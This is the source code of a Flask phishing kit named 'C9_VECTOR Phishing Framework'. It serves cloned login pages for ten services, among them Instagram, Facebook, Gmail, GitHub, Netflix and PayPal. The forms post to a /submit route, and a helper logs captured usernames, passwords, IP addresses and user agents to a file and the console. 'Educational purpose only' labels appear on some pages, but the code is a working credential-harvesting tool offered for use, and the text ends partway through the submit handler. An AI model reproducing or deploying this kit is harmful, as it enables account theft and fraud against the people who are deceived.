#!/usr/bin/env python3
"""
C9_VECTOR Phishing Framework v3.0 - Complete Website
10 Templates: Instagram, Facebook, Twitter, Discord, Snapchat, TikTok, Gmail, GitHub, Netflix, PayPal
Author: C9_VECTOR
"""

from flask import Flask, request, render_template_string, jsonify, redirect
from datetime import datetime
import json
import os
import re

app = Flask(__name__)

# ============================================
# STORAGE
# ============================================
CAPTURED_DATA = []
LOG_FILE = "captured_logs.txt"

# ============================================
# HELPER FUNCTIONS
# ============================================

def save_credentials(data):
    """Save captured credentials to file and memory"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    entry = {
        'timestamp': timestamp,
        'ip': data.get('ip', 'Unknown'),
        'user_agent': data.get('user_agent', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'credentials': data.get('credentials', {})
    }
    CAPTURED_DATA.append(entry)
    
    # Save to file
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"[{timestamp}] NEW CREDENTIALS CAPTURED\n")
        f.write(f"IP: {entry['ip']}\n")
        f.write(f"User-Agent: {entry['user_agent']}\n")
        f.write(f"Platform: {entry['platform']}\n")
        for key, value in entry['credentials'].items():
            f.write(f"  {key}: {value}\n")
        f.write(f"{'='*60}\n")
    
    print(f"\n[+] CREDENTIALS CAPTURED! ({timestamp})")
    print(f"    IP: {entry['ip']}")
    for key, value in entry['credentials'].items():
        print(f"    {key}: {value}")
    print()

def get_client_ip():
    """Get client IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

# ============================================
# TEMPLATES - 10 COMPLETE HTML PAGES
# ============================================

TEMPLATES = {
    'instagram': {
        'name': 'Instagram',
        'logo': '📸',
        'color': '#0095f6',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 350px; }
        .login-box { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 40px 40px 30px; width: 100%; margin-bottom: 10px; }
        .logo { text-align: center; margin-bottom: 30px; font-family: 'Pacifico', cursive; font-size: 42px; font-weight: normal; color: #262626; }
        .form-group { margin-bottom: 8px; }
        .form-group input { width: 100%; padding: 12px 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 14px; color: #262626; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #a8a8a8; }
        .form-group input::placeholder { color: #8e8e8e; font-size: 13px; }
        .login-btn { width: 100%; padding: 10px; margin-top: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .login-btn:hover { background: #1877f2; }
        .divider { display: flex; align-items: center; margin: 18px 0; }
        .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
        .divider-text { padding: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; text-transform: uppercase; }
        .fb-login { text-align: center; margin: 8px 0 12px; }
        .fb-login a { color: #385185; text-decoration: none; font-size: 14px; font-weight: 600; }
        .forgot-password { text-align: center; margin-top: 12px; }
        .forgot-password a { color: #00376b; text-decoration: none; font-size: 13px; }
        .signup-box { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 20px 40px; width: 100%; text-align: center; font-size: 14px; color: #262626; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .app-links { text-align: center; margin-top: 20px; }
        .app-links p { color: #262626; font-size: 14px; margin-bottom: 15px; }
        .app-buttons { display: flex; gap: 10px; justify-content: center; }
        .app-buttons img { height: 40px; cursor: pointer; }
        .footer { margin-top: 20px; color: #8e8e8e; font-size: 12px; text-align: center; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(0,0,0,0.1); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 30px 20px 25px; } .signup-box { padding: 15px 20px; } .logo { font-size: 34px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Log In</button>
                <div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
                <div class="fb-login"><a href="#">Log in with Facebook</a></div>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
        </div>
        <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
        <div class="app-links"><p>Get the app.</p><div class="app-buttons"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Google Play"></div></div>
        <div class="footer"><span>⚠️</span> Security Test by <strong>C9_VECTOR</strong> <span>⚠️</span></div>
    </div>
</body>
</html>
'''
    },
    'facebook': {
        'name': 'Facebook',
        'logo': '📘',
        'color': '#1877f2',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 400px; }
        .login-box { background: #ffffff; border-radius: 8px; padding: 30px 40px 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; }
        .logo { text-align: center; font-size: 38px; color: #1877f2; font-weight: bold; margin-bottom: 25px; }
        .form-group { margin-bottom: 12px; }
        .form-group input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; color: #1d2129; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 4px; }
        .login-btn:hover { background: #166fe5; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .divider-line { flex: 1; height: 1px; background: #dadde1; }
        .divider-text { padding: 0 18px; color: #969ba3; font-size: 13px; font-weight: 600; }
        .forgot-link { text-align: center; margin: 12px 0 20px; }
        .forgot-link a { color: #1877f2; text-decoration: none; font-size: 14px; }
        .create-btn { width: 100%; padding: 14px; background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
        .create-btn:hover { background: #36a420; }
        .footer-text { text-align: center; margin-top: 20px; color: #969ba3; font-size: 14px; }
        .footer-text a { color: #1877f2; text-decoration: none; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(0,0,0,0.08); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 20px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo">facebook</div>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="text" name="email" placeholder="Email address or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="forgot-link"><a href="#">Forgot password?</a></div>
            <div class="divider"><div class="divider-line"></div><div class="divider-text">or</div><div class="divider-line"></div></div>
            <button class="create-btn">Create New Account</button>
        </div>
        <div class="footer-text"><a href="#">Create a Page</a> for a celebrity, brand or business.</div>
    </div>
</body>
</html>
'''
    },
    'twitter': {
        'name': 'Twitter/X',
        'logo': '🐦',
        'color': '#1d9bf0',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000000; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 400px; }
        .login-box { background: #000000; border: 1px solid #2f3336; border-radius: 16px; padding: 40px 32px; width: 100%; }
        .logo { text-align: center; font-size: 36px; color: #ffffff; margin-bottom: 30px; }
        .title { font-size: 28px; font-weight: 700; color: #ffffff; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 12px; }
        .form-group input { width: 100%; padding: 14px 16px; background: #000000; border: 1px solid #2f3336; border-radius: 4px; color: #ffffff; font-size: 16px; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #1d9bf0; }
        .login-btn { width: 100%; padding: 14px; background: #ffffff; color: #000000; border: none; border-radius: 24px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; }
        .login-btn:hover { background: #e8e8e8; }
        .signup-btn { width: 100%; padding: 14px; background: transparent; color: #1d9bf0; border: 1px solid #2f3336; border-radius: 24px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 12px; }
        .signup-btn:hover { background: rgba(29, 155, 240, 0.1); }
        .divider { display: flex; align-items: center; margin: 16px 0; }
        .divider-line { flex: 1; height: 1px; background: #2f3336; }
        .divider-text { padding: 0 16px; color: #6e767d; font-size: 14px; }
        .forgot-link { text-align: center; margin-top: 16px; }
        .forgot-link a { color: #1d9bf0; text-decoration: none; font-size: 14px; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(255,255,255,0.08); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 30px 20px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo">𝕏</div>
            <div class="title">Log in to X</div>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="text" name="username" placeholder="Phone, email, or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="divider"><div class="divider-line"></div><div class="divider-text">or</div><div class="divider-line"></div></div>
            <button class="signup-btn">Create account</button>
            <div class="forgot-link"><a href="#">Forgot password?</a></div>
        </div>
    </div>
</body>
</html>
'''
    },
    'discord': {
        'name': 'Discord',
        'logo': '💬',
        'color': '#5865f2',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 480px; }
        .login-box { background: #2b2d31; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 50px; height: 50px; }
        .title { color: #ffffff; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 8px; }
        .subtitle { color: #b5bac1; font-size: 16px; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #ffffff; font-size: 16px; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #5865f2; }
        .login-btn { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
        .login-btn:hover { background: #4752c4; }
        .forgot-link { text-align: center; margin-top: 16px; }
        .forgot-link a { color: #00a8fc; text-decoration: none; font-size: 14px; }
        .register-box { text-align: center; margin-top: 20px; color: #b5bac1; font-size: 14px; }
        .register-box a { color: #00a8fc; text-decoration: none; font-weight: 600; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(255,255,255,0.1); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 30px 20px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 127.14 96.36" fill="#5865f2"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.42,68.42,0,0,1-10.85,5.18,77.7,77.7,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.87,46,53.87,53,48.69,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5-12.74,11.43-12.74S96.12,46,96.12,53,90.94,65.69,84.69,65.69Z"/></svg></div>
            <div class="title">Welcome back!</div>
            <div class="subtitle">We're so excited to see you again!</div>
            <form method="POST" action="/submit">
                <div class="form-group"><label>Email or Phone Number</label><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="forgot-link"><a href="#">Forgot your password?</a></div>
            <div class="register-box">Need an account? <a href="#">Register</a></div>
        </div>
    </div>
</body>
</html>
'''
    },
    'snapchat': {
        'name': 'Snapchat',
        'logo': '👻',
        'color': '#fffc00',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fffc00; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 400px; }
        .login-box { background: #ffffff; border-radius: 24px; padding: 40px 32px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
        .logo { text-align: center; font-size: 48px; margin-bottom: 20px; }
        .title { font-size: 24px; font-weight: 700; color: #1a1a1a; text-align: center; margin-bottom: 8px; }
        .subtitle { font-size: 14px; color: #666; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 12px; }
        .form-group input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #fffc00; box-shadow: 0 0 0 3px rgba(255,252,0,0.3); }
        .login-btn { width: 100%; padding: 14px; background: #1a1a1a; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
        .login-btn:hover { background: #000000; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(0,0,0,0.08); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 30px 20px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo">👻</div>
            <div class="title">Log In to Snapchat</div>
            <div class="subtitle">Snap, chat, and stay connected!</div>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="text" name="username" placeholder="Username or Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
        </div>
    </div>
</body>
</html>
'''
    },
    'tiktok': {
        'name': 'TikTok',
        'logo': '🎵',
        'color': '#000000',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Log In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000000; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 380px; }
        .login-box { background: #121212; border-radius: 16px; padding: 40px 32px; }
        .logo { text-align: center; font-size: 48px; margin-bottom: 20px; }
        .title { font-size: 24px; font-weight: 700; color: #ffffff; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 12px; }
        .form-group input { width: 100%; padding: 14px; background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 8px; color: #ffffff; font-size: 16px; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #fe2c55; }
        .form-group input::placeholder { color: #6a6a6a; }
        .login-btn { width: 100%; padding: 14px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
        .login-btn:hover { background: #e8244a; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(255,255,255,0.05); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 30px 20px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo">🎵</div>
            <div class="title">Log in to TikTok</div>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="text" name="username" placeholder="Username or Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
        </div>
    </div>
</body>
</html>
'''
    },
    'gmail': {
        'name': 'Gmail',
        'logo': '📧',
        'color': '#1a73e8',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif; background: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 450px; }
        .login-box { background: #ffffff; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 100%; }
        .logo { text-align: center; margin-bottom: 20px; font-size: 28px; color: #4285f4; font-weight: bold; }
        .title { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
        .subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 16px; }
        .form-group input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; color: #202124; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #1a73e8; }
        .login-btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
        .login-btn:hover { background: #1557b0; }
        .links { display: flex; justify-content: space-between; margin-top: 20px; font-size: 14px; }
        .links a { color: #1a73e8; text-decoration: none; }
        .links a:hover { text-decoration: underline; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(0,0,0,0.08); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 30px 20px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo">Gmail</div>
            <div class="title">Sign in</div>
            <div class="subtitle">to continue to Gmail</div>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="email" name="email" placeholder="Email or phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Enter your password" required></div>
                <button type="submit" class="login-btn">Next</button>
            </form>
            <div class="links"><a href="#">Forgot email?</a><a href="#">Create account</a></div>
        </div>
    </div>
</body>
</html>
'''
    },
    'github': {
        'name': 'GitHub',
        'logo': '🐙',
        'color': '#2da44e',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f6f8fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 340px; }
        .logo { text-align: center; font-size: 48px; margin-bottom: 20px; }
        .box { background: white; padding: 30px; border: 1px solid #d0d7de; border-radius: 8px; }
        .box h2 { margin-bottom: 20px; color: #24292f; }
        .form-group { margin-bottom: 12px; }
        .form-group input { width: 100%; padding: 12px; border: 1px solid #d0d7de; border-radius: 4px; font-size: 14px; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #0969da; }
        .login-btn { width: 100%; padding: 12px; background: #2da44e; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
        .login-btn:hover { background: #22863a; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(0,0,0,0.08); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="logo">🐙</div>
        <div class="box">
            <h2>Sign in to GitHub</h2>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="text" name="username" placeholder="Username or email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Sign in</button>
            </form>
        </div>
    </div>
</body>
</html>
'''
    },
    'netflix': {
        'name': 'Netflix',
        'logo': '🎬',
        'color': '#e50914',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #141414; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 450px; }
        .login-box { background: rgba(0,0,0,0.75); border-radius: 8px; padding: 60px 68px 40px; width: 100%; }
        .logo { text-align: center; font-size: 48px; color: #e50914; font-weight: bold; margin-bottom: 30px; }
        .title { font-size: 32px; font-weight: 700; color: #ffffff; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 16px; }
        .form-group input { width: 100%; padding: 16px 20px; background: #333; border: none; border-radius: 4px; color: #ffffff; font-size: 16px; transition: background 0.2s; }
        .form-group input:focus { outline: none; background: #454545; }
        .form-group input::placeholder { color: #8c8c8c; }
        .login-btn { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
        .login-btn:hover { background: #f40612; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(255,255,255,0.05); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 30px 20px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo">NETFLIX</div>
            <div class="title">Sign In</div>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Sign In</button>
            </form>
        </div>
    </div>
</body>
</html>
'''
    },
    'paypal': {
        'name': 'PayPal',
        'logo': '💳',
        'color': '#003087',
        'html': '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 400px; }
        .login-box { background: #ffffff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); width: 100%; }
        .logo { text-align: center; font-size: 36px; color: #003087; font-weight: bold; margin-bottom: 30px; }
        .logo span { color: #009cde; }
        .form-group { margin-bottom: 16px; }
        .form-group input { width: 100%; padding: 14px; border: 1px solid #d9d9d9; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; }
        .form-group input:focus { outline: none; border-color: #0070ba; }
        .login-btn { width: 100%; padding: 14px; background: #0070ba; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
        .login-btn:hover { background: #003087; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(0,0,0,0.08); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 450px) { .login-box { padding: 30px 20px; } .c9-vector { display: none; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="login-box">
            <div class="logo">Pay<span>Pal</span></div>
            <form method="POST" action="/submit">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
        </div>
    </div>
</body>
</html>
'''
    }
}

# ============================================
# ROUTES
# ============================================

@app.route('/')
def index():
    """Homepage - Show available templates"""
    templates_list = []
    for key, value in TEMPLATES.items():
        templates_list.append({
            'id': key,
            'name': value['name'],
            'logo': value['logo'],
            'color': value['color']
        })
    
    html = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C9_VECTOR Phishing Framework</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0a0a; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 900px; }
        .header { text-align: center; margin-bottom: 40px; }
        .header h1 { font-size: 42px; background: linear-gradient(45deg, #ff0000, #ff6b00, #ffd700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
        .header p { color: #888; font-size: 16px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 20px; }
        .card { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.3s ease; text-decoration: none; color: #ffffff; }
        .card:hover { transform: translateY(-5px); border-color: #ff0000; box-shadow: 0 10px 30px rgba(255,0,0,0.2); }
        .card .logo { font-size: 36px; margin-bottom: 10px; }
        .card .name { font-size: 14px; font-weight: 600; }
        .footer { text-align: center; margin-top: 40px; color: #555; font-size: 12px; }
        .footer span { color: #ff0000; }
        .c9-vector { position: fixed; bottom: 10px; right: 15px; color: rgba(255,255,255,0.05); font-size: 12px; font-family: monospace; letter-spacing: 2px; user-select: none; pointer-events: none; }
        @media (max-width: 600px) { .grid { grid-template-columns: repeat(3, 1fr); } .header h1 { font-size: 28px; } }
    </style>
</head>
<body>
    <div class="c9-vector">C9_VECTOR</div>
    <div class="container">
        <div class="header">
            <h1>⚠️ C9_VECTOR</h1>
            <p>Phishing Framework - <span style="color:#ff0000;">TESTING ONLY</span></p>
        </div>
        <div class="grid">
            {% for template in templates %}
            <a href="/{{ template.id }}" class="card">
                <div class="logo">{{ template.logo }}</div>
                <div class="name">{{ template.name }}</div>
            </a>
            {% endfor %}
        </div>
        <div class="footer">
            <span>⚠️</span> Educational Purpose Only <span>⚠️</span>
        </div>
    </div>
</body>
</html>
    '''
    return render_template_string(html, templates=templates_list)

@app.route('/<template_id>')
def show_template(template_id):
    """Show specific template page"""
    if template_id not in TEMPLATES:
        return redirect('/')
    
    return render_template_string(TEMPLATES[template_id]['html'])

@app.route('/submit', methods=['POST'])
def submit():
    """Handle form submission - capture credentials"""
    credentials = {}
    
    # Extract all form data
    for key, value in request.form.items():
